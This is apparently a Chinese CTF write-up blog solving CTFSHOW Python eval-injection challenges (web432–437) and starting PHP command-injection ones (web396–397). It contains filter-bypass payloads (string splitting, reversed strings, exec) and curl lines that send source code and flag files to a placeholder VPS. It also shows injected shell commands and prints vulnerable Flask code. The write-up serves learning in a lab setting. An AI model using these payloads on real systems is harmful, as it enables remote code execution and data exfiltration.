class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`base64 -w 0 app.py`&#x27;))</span><br></pre></td></tr></table></figure><p>默认情况下，<code>base64</code> 命令输出的编码字符串会在<strong>每 76 个字符后自动换行</strong>，所以我们不用<code>cat app.py|base64</code>，会显示不完整，我们用<code>base64 -w 0 app.py</code>即可，参数 <code>-w 0</code>表示取消换行</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822164006703.png"></p><p>解码base64，成功得到网站源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到之前的<code>reg.match(code)</code>改成了<code>reg.search(code)</code>，意味着从检测开头变换到<strong>检测整个字符串</strong></p><p>最后找flag就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822164334048.png"></p><p>得到的flag没有括号，自行加个括号就可以</p><h3 id="web433"><a href="#web433" class="headerlink" title="web433"></a>web433</h3><p>直接用上题的payload会不行，经过测试发现去掉<code>builtins</code>就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p>也可以把so反转成os，<code>[::-1]</code> 是 Python 中<strong>字符串切片</strong>的写法，表示反转字符串。<code>&#39;so&#39;[::-1]</code>结果是 os</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;so&#x27;[::-1]).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p>老样子，我们看看源码，方法跟上题一样，base64带出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题把<code>builtins</code>模块禁了，我们直接<code>import</code>就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;))</span><br></pre></td></tr></table></figure><h3 id="web434"><a href="#web434" class="headerlink" title="web434"></a>web434</h3><p>经过测试，发现这题是把curl过滤了，加个<code>&#39;%2b&#39;</code>在中间就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;cu&#x27;%2b&#x27;rl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p>我们看看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: <span class="comment">#转完之后不是半角字符返回原来的字符</span></span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>发现多了两个函数，用于将字符串中的<strong>全角字符转换为半角字符</strong>，然后后面调用 <code>stringQ2B</code> 将 <code>code</code> 中的全角字符全部转为半角，返回结果重新赋值给 <code>code</code>，对我们影响不大</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;cu&#x27;%2b&#x27;rl http://你的vps地址:端口?p=`cat /flag`&#x27;))</span><br></pre></td></tr></table></figure><h3 id="web435"><a href="#web435" class="headerlink" title="web435"></a>web435</h3><p>测试发现是<strong>把下划线禁了</strong>，我们可以用web433提到的<strong>字符串切片</strong>方法来反转字符串</p><p>首先构建反转代码，我们可以直接引入os，然后调用里面的system函数，原始代码：<code>import os; os.system(&quot;curl http://你的vps地址:端口?p=ls&quot;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure><p>可以在网页看到原始代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822185008504.png"></p><p>我们具体解释一下<code>[::-1]</code>代码，Python 的切片语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sequence[start:stop:step]</span><br></pre></td></tr></table></figure><ul><li><code>start</code> 是切片起始索引（包含该位置）</li><li><code>stop</code> 是结束索引（不包含该位置）</li><li><code>step</code> 是步长（跨越的索引间隔）</li></ul><p>其中三个参数都可以省略</p><p><code>[::-1]</code> 的含义：</p><ul><li><code>start</code> 和 <code>stop</code> 都省略，表示从序列的头到尾</li><li><code>step</code> 是 <code>-1</code> ，表示步长为-1，即<strong>反向遍历序列</strong></li></ul><p>这样会创建序列的<strong>反转副本</strong>，不改变原序列</p><p>然后我们用<code>exec</code>执行这串代码就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822185844411.png"></p><p>可以把它的源码爆出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: <span class="comment">#转完之后不是半角字符返回原来的字符</span></span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>最后我们找flag就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822190335029.png"></p><h3 id="web436"><a href="#web436" class="headerlink" title="web436"></a>web436</h3><p>可以继续用上题的方法</p><p>我们把源码爆出来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: <span class="comment">#转完之后不是半角字符返回原来的字符</span></span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题把<code>getattr</code>过滤了，不过不影响我们做题，步骤跟上题一样</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><h3 id="web437"><a href="#web437" class="headerlink" title="web437"></a>web437</h3><p>跟上题一样的方法</p><p>爆出源码看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>多了个<code>if &#39;\\u&#39; in code</code>，<code>\\u</code> 是一种表示 <strong>Unicode 编码字符</strong> 的转义序列</p><p><strong>具体说明：</strong></p><ul><li>在字符串里，<code>\u</code> 后面跟着 4 位十六进制数字，用来表示一个 Unicode 字符的编码</li><li>比如 <code>\u4f60</code> 表示汉字 “你”，<code>\u597d</code> 表示汉字 “好”</li><li>这种写法在很多编程语言和数据格式（如 JSON）中都用来表达非 ASCII 字符</li></ul><p>这次过滤对我们影响不大，可以继续用上题的步骤</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CTFSHOW 其他篇第二部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 其他篇题解（一）web396 - web416</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-others-1-web396-web416/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-others-1-web396-web416/</id>
    <published>2025-08-21T02:33:16.000Z</published>
    <updated>2025-11-10T04:10:51.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于题目比较多，所以分三个部分来写，这是第一部分</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h3><p>打开题目，可以看到给出了代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820155259833.png"></p><p>会解析传入的URL，然后提取其中的host和path放入代码中执行</p><p>我们分析一下URL结构，举个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com:8080/path/to/resource?user=alice#section1</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">部分</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">scheme</td><td align="left">https</td><td align="left">协议（常见有http、https、ftp等）</td></tr><tr><td align="left">host</td><td align="left"><a href="http://www.example.com/">www.example.com</a></td><td align="left">主机地址&#x2F;域名</td></tr><tr><td align="left">port</td><td align="left">8080</td><td align="left">端口号（省略时默认http是80，https为443）</td></tr><tr><td align="left">path</td><td align="left">&#x2F;path&#x2F;to&#x2F;resource</td><td align="left">路径，资源在服务器的位置</td></tr><tr><td align="left">query</td><td align="left">?user&#x3D;alice</td><td align="left">查询参数</td></tr><tr><td align="left">fragment</td><td align="left">#section1</td><td align="left">页面锚点，供浏览器滚动到指定位置</td></tr></tbody></table><p>回到题目，<code>shell_exec</code>函数可以执行系统命令，因此有很多方法可以做这题</p><p><strong>方法一：反引号执行系统命令</strong></p><p>用反引号执行系统命令，传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>然后打开<code>1.txt</code>查看结果</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820160928378.png"></p><p>直接读取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820161023526.png"></p><p><strong>方法二：$()执行系统命令</strong></p><p>在Shell脚本或命令行里，<code>$()</code>语法可以用来执行系统命令。它的作用叫“命令替换”：会把括号里的命令先执行，然后用输出结果代替<code>$()</code>这个表达式的内容</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法三：分号截断命令</strong></p><p>可以用分号截断当前命令，然后执行新命令，可以直接写文件、写webshell，或者反弹shell都可以，看你喜欢哪个</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt</span><br></pre></td></tr></table></figure><h3 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h3><p>这次把内容写进了<code>/tmp</code>目录里</p><p><img 